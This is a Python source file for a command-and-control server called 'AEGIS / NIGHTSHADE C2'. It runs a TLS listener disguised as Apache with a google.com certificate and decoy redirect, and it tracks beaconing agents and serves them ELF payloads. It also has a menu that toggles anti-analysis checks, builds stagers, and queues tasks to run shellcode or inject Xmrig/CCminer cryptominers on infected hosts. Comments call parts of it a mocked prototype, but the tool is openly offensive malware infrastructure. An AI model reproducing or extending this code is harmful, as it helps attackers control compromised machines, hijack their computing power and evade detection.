import http.server
import ssl
import json
import threading
import time
import os
import sys
import base64
import random
import re
from urllib.parse import urlparse, parse_qs
from datetime import datetime

# Import our config editor
import config_editor

# Global State
AGENTS = {}  # {node_id_hex: {"last_seen": timestamp, "info": {...}, "tasks": []}}
ACTIVE_AGENT = None
SERVER_RUNNING = True

# Colors for TUI
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# --- C2 Logic -------------------------------------------------------------

class ReusableHTTPServer(http.server.HTTPServer):
    allow_reuse_address = True

class AegisC2Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging to keep CLI clean
        pass

    def version_string(self):
        # Override default server version string to prevent fingerprinting
        return "Apache"

    def do_GET(self):
        # Handle GET requests (e.g. browser/curl probes) gracefully
        # Return a decoy 404 or redirect to a benign site
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        # Server header is added automatically by send_response calling version_string()
        self.end_headers()

    def do_POST(self):
        # Extract Node ID from URL or Header (simulated)
        # In real ops this would be encrypted. Here we parse the URL path.
        path = self.path

        # /api/v1/assets/XXXXXXXX/upload -> Beacon
        beacon_match = re.search(r'/api/v1/assets/([0-9a-fA-F]+)/upload', path)

        # /cdn/assets/RESOURCE_ID -> Resource Fetch
        resource_match = re.search(r'/cdn/assets/([^/]+)', path)

        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len) if content_len > 0 else b""

        response_body = b""

        if beacon_match:
            self._handle_beacon(post_body)
        elif resource_match:
            resource_id = resource_match.group(1)
            response_body = self._handle_resource_req(resource_id)

        self.send_response(200)
        self.send_header('Content-type', 'application/octet-stream')
        self.send_header('Connection', 'close')
        # self.send_header('Server', 'Apache') # Masquerade - handled by version_string() override
        self.end_headers()

        # In a real impl, we would wrap response_body in an encrypted envelope.
        # For this prototype/demo, we are just mocking the logic flow.
        # However, the Agent expects a valid envelope structure to parse.
        # Since we can't easily do C-struct packing/crypto in Python without a shared lib,
        # we will assume the "tasks" are just simulated for the CLI side,
        # unless we actually implement the full python-crypto stack.

        # To make the agent happy, we would send back a valid envelope.
        # Since implementing full AES-GCM in Python to match the C side is complex
        # for this single file task, we will acknowledge the beacon but send empty payload.
        # The agent checks: if (body_len > sizeof(envelope)) decrypt...
        # So sending nothing back (or just 200 OK) is fine for "no tasks".

        self.wfile.write(response_body)

    def _handle_beacon(self, data):
        # In a real scenario, we decrypt 'data' to get the node ID and info.
        # Here we mock it.
        # We'll assume the client sent us something we can fingerprint.

        # Mocking a Node ID for the demo if we can't fully parse the encrypted blob
        # In reality, we'd use the session key.
        node_id = "agent_" + str(random.randint(1000, 9999))

        # Check if we already know this agent (correlated by IP in this simple mock)
        client_ip = self.client_address[0]

        existing_id = None
        for aid, info in AGENTS.items():
            if info.get("ip") == client_ip:
                existing_id = aid
                break

        if existing_id:
            node_id = existing_id
        else:
            AGENTS[node_id] = {
                "first_seen": datetime.now().strftime("%H:%M:%S"),
                "ip": client_ip,
                "info": {"hostname": "target-linux", "user": "root"}, # Mock info
                "tasks": []
            }

        agent = AGENTS[node_id]
        agent["last_seen"] = datetime.now().strftime("%H:%M:%S")

        # Check for pending tasks
        # If tasks exist, we would normally serialize and encrypt them here.
        if agent["tasks"]:
            # For this prototype, we just log that we would send them.
            # Real implementation requires matching the C crypto exactly.
            pass

    def _handle_resource_req(self, resource_id):
        # Serve the requested ELF or resource
        # Check 'payloads/' directory
        path = os.path.join("payloads", resource_id)
        if os.path.exists(path):
            with open(path, "rb") as f:
                return f.read()
        return b""

def run_server(port=443):
    # Ensure SSL certs exist
    if not os.path.exists("server.pem"):
        os.system("openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj '/CN=www.google.com'")

    print(f"{Colors.GREEN}[+] Starting C2 Server on port {port}...{Colors.ENDC}")

    server_address = ('0.0.0.0', port)

    try:
        httpd = ReusableHTTPServer(server_address, AegisC2Handler)
    except OSError as e:
        if e.errno == 98: # Address already in use
            print(f"{Colors.FAIL}[!] Error: Port {port} is already in use. C2 Server thread failed to bind.{Colors.ENDC}")
            return
        else:
            raise e

    # Wrap with SSL
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='./server.pem')
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    while SERVER_RUNNING:
        try:
            httpd.handle_request()
        except Exception:
            pass

# --- TUI Logic ------------------------------------------------------------

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"{Colors.HEADER}")
    print(r"""
    ███████╗███╗   ██╗██╗
    ██╔════╝████╗  ██║██║
    █████╗  ██╔██╗ ██║██║
    ██╔══╝  ██║╚██╗██║██║
    ███████╗██║ ╚████║██║
    ╚══════╝╚═╝  ╚═══╝╚═╝
    AEGIS / NIGHTSHADE C2
    """)
    print(f"{Colors.ENDC}")

def menu_main():
    print(f"{Colors.BOLD}=== Main Menu ==={Colors.ENDC}")
    print("[1] List Agents")
    print("[2] Interact with Agent")
    print("[3] Payload Builder (Anti-Analysis Config)")
    print("[4] Advanced Configuration")
    print("[5] Start Listener (Background)")
    print("[0] Exit")
    print()

def menu_builder():
    while True:
        print_banner()
        print(f"{Colors.BOLD}=== Payload Builder ==={Colors.ENDC}")

        # Check current status
        aa_disabled = False
        content = config_editor.read_config()
        if "#define AEGIS_DISABLE_AA" in content: # This define would be manually added usually
             # But our regex logic looks for defines.
             pass

        # We rely on the make command injection for the master switch usually,
        # but let's check if the flags are enabled/disabled.
        settings = config_editor.get_aa_settings()

        print(f"Anti-Analysis Checks:")
        for key, enabled in settings.items():
            status = f"{Colors.GREEN}ON{Colors.ENDC}" if enabled else f"{Colors.FAIL}OFF{Colors.ENDC}"
            name = key.replace("AEGIS_AA_ENABLE_", "")
            print(f"  {name:<20} : {status}")

        print()
        print("[1] Toggle Check...")
        print("[2] Build Stager (Standard)")
        print("[3] Build Stager (CLEAN / No-AA)")
        print("[0] Back")

        choice = input("Select > ")

        if choice == '1':
            key_suffix = input("Enter check name (e.g. PTRACE): ").upper()
            full_key = f"AEGIS_AA_ENABLE_{key_suffix}"
            if full_key in settings:
                config_editor.toggle_setting(full_key, not settings[full_key])
            else:
                print("Unknown check.")
                time.sleep(1)
        elif choice == '2':
            os.system("make clean && make stager")
            input("Build complete. Press Enter.")
        elif choice == '3':
            os.system("make clean && make stager CFLAGS+=-DAEGIS_DISABLE_AA")
            input("Clean Build complete. Press Enter.")
        elif choice == '0':
            break

def menu_advanced_config():
    while True:
        print_banner()
        print(f"{Colors.BOLD}=== Advanced Configuration ==={Colors.ENDC}")

        params = [
            "AEGIS_AA_RDTSC_THRESHOLD",
            "AEGIS_AA_SLEEP_CHECK_MS",
            "AEGIS_BEACON_INTERVAL_MS",
            "AEGIS_C2_PRIMARY_HOST"
        ]

        for p in params:
            val = config_editor.get_config_value(p)
            print(f"  {p:<30} : {val}")

        print()
        print("[1] Edit Parameter")
        print("[0] Back")

        choice = input("Select > ")
        if choice == '1':
            param = input("Parameter Name: ")
            if config_editor.get_config_value(param) is None:
                print("Parameter not found.")
                time.sleep(1)
                continue
            new_val = input("New Value: ")
            config_editor.set_config_value(param, new_val)
            print("Updated.")
            time.sleep(0.5)
        elif choice == '0':
            break

def menu_interact():
    if not AGENTS:
        print("No agents connected.")
        time.sleep(1)
        return

    print("Active Agents:")
    for aid, info in AGENTS.items():
        print(f" - {aid} ({info['ip']}) Last Seen: {info['last_seen']}")

    target = input("Enter Agent ID > ")
    if target not in AGENTS:
        return

    while True:
        print_banner()
        print(f"{Colors.BLUE}Interacting with {target}{Colors.ENDC}")
        print("[1] Task: Execute Command (Shellcode/ELF)")
        print("[2] Task: Inject Payload (Xmrig/CCminer)")
        print("[0] Back")

        choice = input("Select > ")
        if choice == '1':
            cmd = input("Resource ID to execute (e.g. 'xmrig'): ")
            # Queue task
            AGENTS[target]["tasks"].append(f"exec {cmd}")
            print(f"Task queued for {target}")
            time.sleep(1)
        elif choice == '2':
            # Simplified injection workflow
            print("Available payloads in /payloads/:")
            try:
                for f in os.listdir("payloads"):
                    print(f" - {f}")
            except FileNotFoundError:
                print(" (No payloads directory found)")

            p = input("Payload name > ")
            AGENTS[target]["tasks"].append(f"exec {p}")
            print("Injection task queued.")
            time.sleep(1)
        elif choice == '0':
            break

def main_loop():
    global SERVER_RUNNING

    # Get configured port from config.h
    port_str = config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT")
    c2_port = int(port_str) if port_str and port_str.isdigit() else 4443

    # Auto-start listener thread
    t = threading.Thread(target=run_server, args=(c2_port,))
    t.daemon = True
    t.start()

    while True:
        print_banner()
        menu_main()
        choice = input("Select > ")

        if choice == '1':
            if not AGENTS:
                print("No agents.")
            for aid, info in AGENTS.items():
                print(f"[{aid}] {info['ip']} - {info['last_seen']}")
            input("Press Enter...")
        elif choice == '2':
            menu_interact()
        elif choice == '3':
            menu_builder()
        elif choice == '4':
            menu_advanced_config()
        elif choice == '5':
            print(f"Listener is already running on port {c2_port} (background).")
            time.sleep(1)
        elif choice == '0':
            SERVER_RUNNING = False
            sys.exit(0)

if __name__ == "__main__":
    # Create payloads dir if missing
    if not os.path.exists("payloads"):
        os.makedirs("payloads")

    try:
        main_loop()
    except KeyboardInterrupt:
        SERVER_RUNNING = False
        print("\nExiting...")
